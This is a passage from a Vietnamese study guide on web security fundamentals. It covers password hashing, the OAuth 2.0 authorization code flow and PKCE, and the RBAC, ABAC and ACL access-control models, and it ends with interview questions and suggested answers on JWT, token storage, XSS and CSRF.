| **Tuỳ chỉnh** | Chỉ có cost factor | Bộ nhớ + Thời gian + Số luồng song song |
| **Chống GPU** | Tốt | **Tốt hơn** (đòi hỏi nhiều bộ nhớ → GPU khó tấn công) |
| **Khuyến nghị** | Vẫn an toàn, hệ sinh thái trưởng thành | Tốt hơn về mặt lý thuyết |
| **Giới hạn** | Tối đa 72 byte mật khẩu | Không giới hạn |

> bcrypt vẫn an toàn và đủ dùng, hệ sinh thái trưởng thành. argon2 mới hơn, mạnh hơn, nhưng ít thư viện hỗ trợ hơn. Quan trọng nhất: **tuyệt đối không** dùng MD5 hay SHA-256 đơn thuần để băm mật khẩu.

---

# 11. OAuth 2.0 — Tổng quan

## OAuth 2.0 là gì?

OAuth 2.0 là một **khung phân quyền** — cho phép ứng dụng bên thứ ba truy cập tài nguyên của người dùng **mà không cần biết mật khẩu** của họ.

**Ví dụ thực tế:** Khi bạn bấm "Đăng nhập bằng Google", website của bạn không bao giờ thấy mật khẩu Google của người dùng — website chỉ nhận được một token từ Google, cho phép đọc email và tên.

## Các vai trò trong OAuth

| Vai trò | Giải thích | Ví dụ |
|---|---|---|
| **Chủ tài nguyên** | Người dùng — chủ sở hữu dữ liệu | Bạn (chủ tài khoản Google) |
| **Ứng dụng client** | Ứng dụng muốn truy cập dữ liệu | Website hoặc ứng dụng di động của bạn |
| **Server phân quyền** | Server cấp token | Google OAuth Server |
| **Server tài nguyên** | Server lưu trữ dữ liệu | Google API (Gmail, Calendar...) |

## Luồng Authorization Code (phổ biến nhất)

```
Người dùng       Ứng dụng client      Server phân quyền    Server tài nguyên
 │                    │                     │                      │
 │── Bấm Đăng nhập ─►│                     │                      │
 │                    │── Chuyển hướng ────►│                      │
 │                    │   /authorize?       │                      │
 │                    │   client_id=xxx     │                      │
 │                    │   redirect_uri=xxx  │                      │
 │                    │   scope=email       │                      │
 │                    │   response_type=code│                      │
 │                    │                     │                      │
 │◄── Trang đăng nhập ────────────────────│                      │
 │── Nhập thông tin ───────────────────────►│                      │
 │── Đồng ý cho phép ─────────────────────►│                      │
 │                    │                     │                      │
 │◄── Chuyển hướng + code=abc123 ──────────│                      │
 │── Theo đường dẫn ──►│                     │                      │
 │                    │── POST /token ─────►│                      │
 │                    │   code=abc123       │                      │
 │                    │   client_secret=xxx │                      │
 │                    │◄── access_token ────│                      │
 │                    │                     │                      │
 │                    │── GET /api/user ────────────────────────────►│
 │                    │   Bearer <token>    │                       │
 │                    │◄── dữ liệu user ───────────────────────────│
 │◄── Đã đăng nhập! ──│                     │                      │
```

**Các bước quan trọng:**
1. Ứng dụng chuyển hướng người dùng đến server phân quyền
2. Người dùng đăng nhập và đồng ý chia sẻ dữ liệu
3. Server phân quyền chuyển hướng về ứng dụng kèm **mã xác thực (authorization code)**
4. Ứng dụng dùng mã xác thực + client_secret để đổi lấy **access token** (giao tiếp giữa các server, an toàn)
5. Ứng dụng dùng access token để gọi server tài nguyên

## PKCE — Bảo vệ thêm cho ứng dụng công khai

**Dùng cho:** Các ứng dụng không giữ được bí mật — SPA (chạy trên trình duyệt), ứng dụng di động — nơi không thể giấu `client_secret` một cách an toàn.

```
1. Ứng dụng tạo code_verifier (chuỗi ngẫu nhiên dài)
2. Ứng dụng tính code_challenge = SHA256(code_verifier)
3. Gửi code_challenge cho server phân quyền lúc xin mã xác thực
4. Khi đổi mã xác thực lấy token → gửi kèm code_verifier
5. Server kiểm tra: SHA256(code_verifier) có khớp code_challenge đã lưu không
```

→ Kể cả kẻ tấn công chặn được mã xác thực, chúng cũng không có `code_verifier` nên không thể đổi lấy token.

---

# 12. Phân quyền — RBAC, ABAC, ACL

Phân quyền (Authorization) là quá trình xác định **ai được phép làm gì** với **tài nguyên nào**. Có nhiều mô hình phân quyền, mỗi mô hình phù hợp với quy mô và độ phức tạp khác nhau.

## RBAC — Phân quyền dựa trên vai trò (Role-Based Access Control)

### Bản chất

Mỗi người dùng được **gán một hoặc nhiều vai trò** (role). Mỗi vai trò chứa **một tập hợp quyền** (permissions). Khi kiểm tra phân quyền, hệ thống chỉ cần xem người dùng có vai trò nào → vai trò đó có quyền tương ứng không.

### Cách hoạt động

```
Người dùng ──── gán ────► Vai trò ──── chứa ────► Quyền

Ví dụ:
  Hùng ──── gán ────► admin  ──── chứa ────► tạo_bài, sửa_bài, xoá_bài, quản_lý_user
  Lan  ──── gán ────► editor ──── chứa ────► tạo_bài, sửa_bài
  Mai  ──── gán ────► viewer ──── chứa ────► xem_bài
```

### Ưu và nhược điểm

| Ưu điểm | Nhược điểm |
|---|---|
| Đơn giản, dễ hiểu, dễ quản lý | Khi số vai trò nhiều lên → "bùng nổ vai trò" (role explosion) |
| Phù hợp đa số ứng dụng vừa và nhỏ | Không linh hoạt khi cần điều kiện phức tạp (giờ làm việc, địa điểm...) |
| Dễ kiểm toán (audit) — xem ai có vai trò gì rất rõ ràng | Khó xử lý trường hợp ngoại lệ |

### Ví dụ mã nguồn

```typescript
// NestJS — RBAC
@UseGuards(AuthGuard, RolesGuard)
@Roles('admin')              // ← chỉ admin mới truy cập được
@Get('/admin/dashboard')
getDashboard() { ... }

@UseGuards(AuthGuard, RolesGuard)
@Roles('admin', 'editor')    // ← admin HOẶC editor
@Post('/posts')
createPost() { ... }
```

---

## ABAC — Phân quyền dựa trên thuộc tính (Attribute-Based Access Control)

### Bản chất

Quyền truy cập được xác định bằng cách **đánh giá nhiều thuộc tính kết hợp** — thuộc tính của người dùng, thuộc tính của tài nguyên, thuộc tính của môi trường (thời gian, địa điểm...).

### Cách hoạt động

```
Quyền truy cập = đánh_giá(
  thuộc_tính_người_dùng,     ← phòng ban, cấp bậc, vị trí...
  thuộc_tính_tài_nguyên,     ← loại tài liệu, mức độ mật, chủ sở hữu...
  thuộc_tính_môi_trường      ← giờ hiện tại, địa chỉ IP, thiết bị...
)

Ví dụ chính sách:
  "Nhân viên phòng Nhân sự (phòng_ban = HR)
   có cấp bậc trưởng phòng trở lên (cấp_bậc >= 5)
   chỉ được xem bảng lương (tài_nguyên = bảng_lương)
   trong giờ làm việc (8h-17h)
   và từ mạng nội bộ công ty (IP nội bộ)"
```

### Ưu và nhược điểm

| Ưu điểm | Nhược điểm |
|---|---|
| Cực kỳ linh hoạt — biểu diễn được hầu như mọi chính sách | Phức tạp khi triển khai và bảo trì |
| Không bị "bùng nổ vai trò" | Khó kiểm toán — chính sách phức tạp khó đọc |
| Phản ứng theo ngữ cảnh (giờ giấc, địa điểm, thiết bị) | Hiệu suất có thể chậm hơn (đánh giá nhiều điều kiện) |

### Ví dụ mã nguồn

```typescript
// NestJS — ABAC
@UseGuards(AuthGuard, PolicyGuard)
@CheckPolicy((user, resource) =>
  user.department === 'HR' &&
  user.level >= 5 &&
  isWithinWorkHours() &&
  isInternalNetwork(user.ip)
)
@Get('/salary/:id')
getSalary() { ... }
```

---

## ACL — Danh sách kiểm soát truy cập (Access Control List)

### Bản chất

Mỗi tài nguyên có một **danh sách** ghi rõ **ai được làm gì** với tài nguyên đó. Cách tiếp cận này gắn quyền **trực tiếp vào tài nguyên**, không thông qua vai trò.

### Cách hoạt động

```
Tài nguyên: "Tài liệu dự án X"
  ├── Hùng  → đọc, sửa, xoá
  ├── Lan   → đọc, sửa
  └── Mai   → đọc

Tài nguyên: "Thư mục ảnh gia đình"
  ├── Hùng  → đọc, sửa, xoá
  └── Lan   → đọc
```

### Khi nào dùng

- Hệ thống file (quyền đọc/ghi/thực thi trên từng file/thư mục trong Linux)
- Google Drive, Dropbox (chia sẻ file cho từng người cụ thể)
- Khi cần kiểm soát quyền **chi tiết đến từng tài nguyên cụ thể**

---

## Bảng so sánh ba mô hình

| | RBAC | ABAC | ACL |
|---|---|---|---|
| **Cơ chế** | Gán quyền theo **vai trò** | Đánh giá nhiều **thuộc tính** kết hợp | Danh sách quyền gắn trực tiếp vào **tài nguyên** |
| **Độ phức tạp** | Đơn giản | Phức tạp | Trung bình |
| **Linh hoạt** | Trung bình | Rất cao | Cao (ở mức từng tài nguyên) |
| **Quản lý** | Dễ — thêm/xoá vai trò | Khó — viết và bảo trì chính sách | Khó khi số tài nguyên lớn |
| **Phù hợp** | Đa số ứng dụng | Doanh nghiệp lớn, chính sách phức tạp | Hệ thống file, chia sẻ tài liệu |
| **Ví dụ thực tế** | Admin/Editor/Viewer | Chính sách doanh nghiệp đa điều kiện | Google Drive, Linux file permissions |

---

# 13. Câu hỏi phỏng vấn thường gặp

## Câu hỏi nền tảng

| Câu hỏi | Gợi ý trả lời |
|---|---|
| Mã hoá khác băm thế nào? | **Mã hoá**: hai chiều (mã hoá ↔ giải mã), dùng khoá, mục đích giữ **bí mật**. **Băm**: một chiều (không đảo ngược), không cần khoá, mục đích kiểm tra **toàn vẹn** |
| Ký số khác mã hoá thế nào? | **Mã hoá**: giấu nội dung (bí mật). **Ký số**: đóng dấu xác nhận — không giấu nội dung nhưng đảm bảo **không ai sửa** và **xác minh nguồn gốc** |
| Stateful và stateless khác nhau ở đâu? | **Stateful**: server lưu trạng thái (session), dễ thu hồi, khó mở rộng. **Stateless**: server không lưu gì, yêu cầu mang theo đầy đủ thông tin (JWT), dễ mở rộng, khó thu hồi |

## Câu hỏi về JWT

| Câu hỏi | Gợi ý trả lời |
|---|---|
| JWT là gì? | Tiêu chuẩn mở (RFC 7519) để truyền thông tin giữa các bên dưới dạng JSON, nhỏ gọn và tự chứa. Token được ký số để đảm bảo tính toàn vẹn |
| JWT gồm mấy phần? | 3 phần ngăn cách bằng dấu chấm: Header (thuật toán ký), Payload (dữ liệu — các claims), Signature (chữ ký đảm bảo toàn vẹn) |
| JWT có phải mã hoá không? | **Không.** JWT (dạng JWS) chỉ **ký**, bất kỳ ai cũng giải mã được payload bằng base64. Chữ ký đảm bảo **không ai sửa được**, không đảm bảo **không ai đọc được** |
| Validate và Verify khác nhau? | **Validate** = kiểm tra cấu trúc (đủ 3 phần, format đúng). **Verify** = xác minh chữ ký (đảm bảo token chưa bị sửa, đến từ nguồn đáng tin) |
| "Tự chứa" nghĩa là gì? | Payload chứa sẵn thông tin người dùng (ID, vai trò) → server xác minh chữ ký rồi dùng luôn, **không cần truy vấn cơ sở dữ liệu** |
| Session khác JWT ở điểm nào? | Session: có trạng thái (server lưu), dễ thu hồi, khó mở rộng. JWT: không trạng thái (client giữ token), dễ mở rộng, khó thu hồi |

## Câu hỏi về HS256 / RS256

| Câu hỏi | Gợi ý trả lời |
|---|---|
| HS256 khác RS256 thế nào? | **HS256**: đối xứng, 1 khoá duy nhất. **RS256**: bất đối xứng, khoá riêng để ký, khoá công khai để xác minh. Lộ khoá công khai → không sao |
| Khi nào dùng RS256? | Khi có **nhiều dịch vụ** cần xác minh token nhưng **chỉ 1 dịch vụ** được phép tạo token (microservices) |
| Khoá công khai lộ ra có sao không? | **Không sao.** Khoá công khai chỉ **xác minh** chữ ký, **không thể tạo** token mới. Chỉ khoá riêng mới tạo được |
| Khoá riêng và khoá bí mật có giống nhau? | **Khác.** Khoá bí mật (secret) = 1 khoá dùng chung cho HS256 (đối xứng). Khoá riêng (private key) = 1 trong cặp khoá RS256 (bất đối xứng), chỉ bên ký giữ. Cả hai đều phải giữ bí mật, nhưng "bí mật" (secret) ở HS256 là shared secret, còn khoá riêng (private key) thì **không ai được biết ngoài bên ký** |

## Câu hỏi về Access Token / Refresh Token

| Câu hỏi | Gợi ý trả lời |
|---|---|
| Tại sao cần 2 loại token? | Access token ngắn (15 phút) để giảm rủi ro nếu bị cắp. Refresh token dài (7 ngày) để lấy access token mới mà không cần đăng nhập lại |
| Access token hết hạn thì sao? | Client gửi refresh token → server cấp access token mới + refresh token mới (xoay vòng) → huỷ refresh token cũ |
| Xoay vòng Refresh Token là gì? | Mỗi lần dùng refresh token → cấp cái mới, huỷ cái cũ. Nếu cái cũ bị tái sử dụng → **phát hiện xâm nhập** → thu hồi toàn bộ token |
| Refresh token có phải JWT không? | **Không bắt buộc.** Có thể là chuỗi ngẫu nhiên (opaque token) lưu trong DB (đã băm). Không cần tính tự chứa vì chỉ gửi về server xác thực |
| JWT không trạng thái thì đăng xuất thế nào? | Xoá refresh token từ DB. Access token: (1) thời hạn ngắn, (2) danh sách đen Redis, (3) phiên bản token |

## Câu hỏi về lưu trữ Token

| Câu hỏi | Gợi ý trả lời |
|---|---|
| Lưu token ở đâu? | Access: biến JS hoặc httpOnly cookie. Refresh: **httpOnly cookie** (Secure, SameSite=Strict). **Tuyệt đối không** localStorage |
| Tại sao không lưu trong localStorage? | Vì bất kỳ mã JS nào cũng đọc được localStorage → nếu bị XSS, kẻ tấn công đánh cắp token dễ dàng |
| localStorage khác sessionStorage thế nào? | localStorage tồn tại vĩnh viễn, chia sẻ giữa các tab. sessionStorage mất khi đóng tab, mỗi tab có bản riêng |
| HttpOnly cookie là gì? | Cookie có cờ HttpOnly → JavaScript **không thể đọc** → chống XSS. Chỉ trình duyệt mới gửi cookie qua HTTP |
| HttpOnly cookie có nhược điểm gì? | Dễ bị CSRF (cookie tự động gửi) → cần thêm SameSite và CSRF token. JS không đọc được nên khó kiểm tra trạng thái token phía giao diện |

## Câu hỏi về XSS / CSRF

| Câu hỏi | Gợi ý trả lời |
|---|---|
| XSS là gì? | Kẻ tấn công **chèn mã JS độc** vào trang web → mã chạy trên trình duyệt nạn nhân → đánh cắp dữ liệu (token, cookie) |
| CSRF là gì? | Kẻ tấn công **lừa trình duyệt** gửi yêu cầu giả → lợi dụng cookie tự động gửi → server tưởng người dùng thật |
| XSS khác CSRF thế nào? | **XSS**: chèn mã → đọc/đánh cắp dữ liệu. **CSRF**: lừa gửi yêu cầu → thực hiện hành động giả mạo. XSS đọc được, CSRF thì không |
| Cách chống XSS? | Làm sạch đầu vào, mã hoá đầu ra, CSP, HttpOnly cookie, không lưu token trong localStorage |
| Cách chống CSRF? | SameSite cookie, CSRF token, kiểm tra header Origin/Referer |
| Tại sao không lưu token trong localStorage? | Vì XSS — 1 dòng `localStorage.getItem('token')` là đánh cắp xong |

## Câu hỏi về mật khẩu và khác

| Câu hỏi | Gợi ý trả lời |
|---|---|
| bcrypt hoạt động thế nào? | Băm mật khẩu + salt ngẫu nhiên + cost factor (2^n vòng lặp). Salt chống bảng cầu vồng, cost factor chống thử brute force |
| bcrypt hay argon2? | argon2 mới hơn, chống GPU tốt hơn (đòi hỏi bộ nhớ). bcrypt vẫn an toàn. **Tuyệt đối không** dùng MD5 hay SHA đơn thuần |
| Tại sao không dùng SHA-256 để băm mật khẩu? | SHA-256 quá nhanh → kẻ tấn công tính được hàng tỷ giá trị mỗi giây. bcrypt/argon2 **cố tình chậm** để chống brute force |
| OAuth 2.0 là gì? | Khung phân quyền — cho phép ứng dụng truy cập tài nguyên của người dùng mà **không cần biết mật khẩu** |
| RBAC khác ABAC thế nào? | **RBAC**: phân quyền theo vai trò cố định (admin, editor), đơn giản. **ABAC**: phân quyền theo nhiều thuộc tính kết hợp (phòng ban + cấp bậc + giờ giấc), linh hoạt hơn nhưng phức tạp hơn |
| PKCE dùng khi nào? | Cho ứng dụng công khai (SPA, di động) không giữ được client_secret an toàn |
